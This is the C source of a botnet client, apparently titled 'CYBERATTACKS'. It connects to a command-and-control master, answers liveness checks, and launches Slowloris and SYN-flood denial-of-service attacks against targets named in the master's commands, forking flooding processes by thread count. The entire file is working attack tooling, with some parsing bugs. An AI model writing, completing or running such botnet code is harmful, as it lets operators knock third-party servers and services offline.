#include "packet.h"
#include <strings.h>
#include <time.h>
#include "attacks/slow-loris.h"
#include "attacks/syn-flood.h"

#define SLOW_LORIS 0
#define SYN_FLOOD 1
#define ALL 2

#define BOT_MASTER "127.0.0.1"

int main_sock;
struct sockaddr_in server;
int server_size;

// reads from the udp socket which is connected to the master. and closes if it recieves the signal.
// ****Need to add the close function for the file descriptors for both the fucntions recieving and sending.
void wait_and_close(int f_write)
{
	server_size = sizeof(struct sockaddr_in);
	char data[12];
	while(1){
		recvfrom(main_sock, data, 10, 0, (struct sockaddr*)&server, &server_size);
		if(strstr(data, "UP?") != NULL){
			// Run the code to tell that we are alive.
			sendto(main_sock, "?YES!", 5, 0, (struct sockaddr*)&server, sizeof(struct sockaddr_in));
		}else if(strstr(data, "[!DDOS!]") != NULL){
			// Run the exit stuff here
			fprintf(f_write, "%s", "EXIT");
			close(f_write);
			connect_to_master(BOT_MASTER, 15551);
		}
	}
}


// NOTE: forks will be ignored for now
void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url)
{

	if(type == SLOW_LORIS){
		int msg_pipe[2];
		pipe(msg_pipe);

		pid_t pid = fork();
		
		if(pid == 0){
			// closes the output to write to.
			close(msg_pipe[1]);
			// Here goes the flood_slow_loris.
			flood_slow_loris(target_ip, n_thrds, NULL, msg_pipe[0]);
			exit(0);
		}else{
			close(msg_pipe[0]);
			wait_and_close(msg_pipe[1]);
		}
	} else if(type == SYN_FLOOD){
		int msg_pipe[2];
		pipe(msg_pipe);

		pid_t pid = fork();
		
		if(pid == 0){
			// closes the output to write to.
			close(msg_pipe[1]);
			flood_with_syn(target_ip, port, n_thrds, msg_pipe[0]);
			exit(0);
		}else{
			// closes the input to recv from.
			close(msg_pipe[0]);
			wait_and_close(msg_pipe[1]);
		}
	} else if(type == ALL){
		// need to add the pipe functionality.
		int msg_pipe[2];
		pipe(msg_pipe);
		pid_t pid1 = fork();
		if(pid1 == 0){
			close(msg_pipe[1]);
			flood_slow_loris(target_url, n_thrds, NULL, msg_pipe[0]);
			exit(0);
		}
		pid_t pid2 = fork();

		if(pid2 == 0){
			close(msg_pipe[1]);
			flood_with_syn(target_ip, port, n_thrds, msg_pipe[0]);
			exit(0);
		}
		wait_and_close(msg_pipe[1]);
	}

}

void connect_to_master(char *to_con, int port)
{
	main_sock = make_socket();
	connect_to(main_sock, to_con, port, &server);
	printf("\033[0;35m[+] Connected to %s \033[0m\n", to_con);
	int bytes;
	char data_recved[80];
	int type;
	char target_ip[30];
	char thrds[4];
	char s_port[6];
	server_size = sizeof(struct sockaddr);
	while(1){
		bytes = recvfrom(main_sock, data_recved, 80, 0, (struct sockaddr *)&server, &server_size);

		printf("Bytes: %d\n", bytes);

		if (bytes== ERROR){
			perror("Unable to recv Data: ");
			exit(1);
		}else if(bytes == 0){
			printf("[*] Server Closed the connection\n");
			return;
		}
		// DEBUG
		printf("Data: %s\n", data_recved);


		if(strncmp(data_recved, "STARTED", 7) == 0){
			printf("[+] Server is Up and Running\n\tWaiting for server requests");
		}else if(strncmp(data_recved, "SLOW-LORIS", 10) == 0){
			type = SLOW_LORIS;

			char *i_of_ip = index(data_recved, (int ) ' ');
			int len_ip =  (index(i_of_ip+1, (int ) ' ')) - i_of_ip;
			strncpy(target_ip, i_of_ip, len_ip);
			// DEBUG
			printf("IP: %s|\n", target_ip);

			char *i_of_thrds = index(i_of_ip+len_ip, (int ) ' ');
			int len_thrds = (index(i_of_thrds+1, (int) ' ')) - i_of_thrds;
			strncpy(thrds, i_of_thrds, len_thrds);
			// DEBUG
			printf("Threads: %s|\n", thrds);

			DDOS(type, target_ip, NULL, atoi(thrds), NULL);

		}else if(strncmp(data_recved, "SYN-FLOOD", 9) == 0){
			type = SYN_FLOOD;

			char *i_of_ip = index(data_recved, (int ) ' ');
			int len_ip =  (index(i_of_ip+1, (int ) ' ')) - i_of_ip;
			strncpy(target_ip, i_of_ip, len_ip);
			// DEBUG
			printf("IP: %s|\n", target_ip);

			char *i_of_thrds = index(i_of_ip+len_ip, (int ) ' ');
			int len_thrds = (index(i_of_thrds+1, (int) ' ')) - i_of_thrds;
			strncpy(thrds, i_of_thrds, len_thrds);
			// DEBUG
			printf("Threads: %s|\n", thrds);

			char *i_of_port = rindex(data_recved, (int ) ' ');
			strncpy(s_port, i_of_port, 6);
			// DEBUG
			printf("port: %s|\n", s_port);

			DDOS(type, target_ip, atoi(s_port), atoi(thrds), NULL);

		}else if(strncmp(data_recved, "*", 1)){
			type = ALL;

			char target_url[30];

			char *i_of_ip = index(data_recved, (int ) ' ');
			int len_ip =  (index(i_of_ip+1, (int ) ' ') - i_of_ip);
			strncpy(target_ip, i_of_ip, len_ip);
			// DEBUG
			printf("IP: %s|\n", target_ip);

			char *i_of_url = index(i_of_ip+len_ip, (int ) ' ');
			int len_url = (index(i_of_url+1, (int ) ' ') - i_of_url);
			strncpy(target_url, i_of_url, len_url);
			// DEBUG
			printf("URL: %s\n", target_url);

			char *i_of_port = index(i_of_url+len_url, (int )' ');
			int len_port = (index(i_of_port+1, (int) ' ') - i_of_port);
			strncpy(s_port, i_of_port, len_port);
			// DEBUG
			printf("Port for SYN_FLOOD: %s\n", s_port);

			char *i_of_thrds = rindex(data_recved, (int) ' ');
			strncpy(thrds, i_of_thrds, 4);
			// DEBUG
			printf("Threads: %s\n", thrds);

			// ******SERIOUS****** add the fucntionality for multiple DDOS types.
			DDOS(type, target_ip, atoi(s_port), atoi(thrds), target_url);

		}

	}
}

int main(int argc, char const *argv[])
{
	// Printing the Banner.
	srand(time(NULL));
	switch(rand()%5){
		case 0:
			printf("\033[0;31m");break;
		case 1:
			printf("\033[0;32m");break;
		case 2:
			printf("\033[0;34m");break;
		case 3:
			printf("\033[0;33m");break;
		case 4:
			printf("\033[0;35m");break;
	}
	printf(" ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄\n");
	printf("▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf("▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ \n");
	printf("▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░▌          ▐░▌          \n");
	printf("▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ \n");
	printf("▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf("▐░▌           ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀█░█▀▀      ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌\n");
	printf("▐░▌               ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌  ▐░▌     ▐░▌       ▐░▌     ▐░▌                    ▐░▌\n");
	printf("▐░█▄▄▄▄▄▄▄▄▄      ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ ▐░▌      ▐░▌  ▄▄▄▄█░█▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌\n");
	printf("▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf(" ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ \n");
	printf("\033[0m\n");

	printf("\033[0;32m[+] Initializing the Bot!\033[0m\n");
	
	// Change the IP when compiling.
	connect_to_master(BOT_MASTER, 15551);

	close(main_sock);
	return 0;
}